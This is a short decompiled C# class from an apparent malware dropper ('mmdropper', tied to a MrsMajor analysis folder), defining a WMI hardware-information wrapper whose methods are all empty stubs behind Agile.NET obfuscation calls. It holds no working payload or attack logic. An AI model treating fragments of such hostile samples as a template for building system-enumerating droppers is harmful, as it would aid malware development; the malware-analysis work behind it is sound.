// Decompiled with JetBrains decompiler
// Type: BaseWin32Entity
// Assembly: mmdropper, Version=1.0.7321.42228, Culture=neutral, PublicKeyToken=null
// MVID: 67C14436-991D-42DC-A31E-001F369439CC
// Assembly location: C:\Users\victim\Documents\GitHub\MrsMajor5.0\AgileStringDecryptor-master\bin\Debug\net48\eulascr-Utf8Fixed.exe

using System.Collections.Generic;
using System.Management;
using System.Runtime.CompilerServices;

internal abstract class BaseWin32Entity
{
  public Dictionary<string, object> Properties
  {
    [MethodImpl(MethodImplOptions.NoInlining)] get => (Dictionary<string, object>) null;
    [MethodImpl(MethodImplOptions.NoInlining)] set
    {
    }
  }

  public string Caption
  {
    [MethodImpl(MethodImplOptions.NoInlining)] get => (string) null;
    [MethodImpl(MethodImplOptions.NoInlining)] protected set
    {
    }
  }

  public string Name
  {
    [MethodImpl(MethodImplOptions.NoInlining)] get => (string) null;
    [MethodImpl(MethodImplOptions.NoInlining)] protected set
    {
    }
  }

  public string Manufacturer
  {
    [MethodImpl(MethodImplOptions.NoInlining)] get => (string) null;
    [MethodImpl(MethodImplOptions.NoInlining)] protected set
    {
    }
  }

  public string Model
  {
    [MethodImpl(MethodImplOptions.NoInlining)] get => (string) null;
    [MethodImpl(MethodImplOptions.NoInlining)] protected set
    {
    }
  }

  public string Description
  {
    [MethodImpl(MethodImplOptions.NoInlining)] get => (string) null;
    [MethodImpl(MethodImplOptions.NoInlining)] protected set
    {
    }
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  public BaseWin32Entity(ManagementBaseObject obj)
  {
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  public override string ToString() => (string) null;

  [MethodImpl(MethodImplOptions.NoInlining)]
  protected string PrintProperties() => (string) null;

  [MethodImpl(MethodImplOptions.NoInlining)]
  private object GetValue(object value) => (object) null;

  [MethodImpl(MethodImplOptions.NoInlining)]
  protected string ToJSON(object value) => (string) null;

  [MethodImpl(MethodImplOptions.NoInlining)]
  protected T ParseValue<T>(ManagementBaseObject obj, string key) => default (T);

  [MethodImpl(MethodImplOptions.NoInlining)]
  static BaseWin32Entity()
  {
    AgileDotNetRT.Initialize();
    AgileDotNetRT.PostInitialize();
  }
}
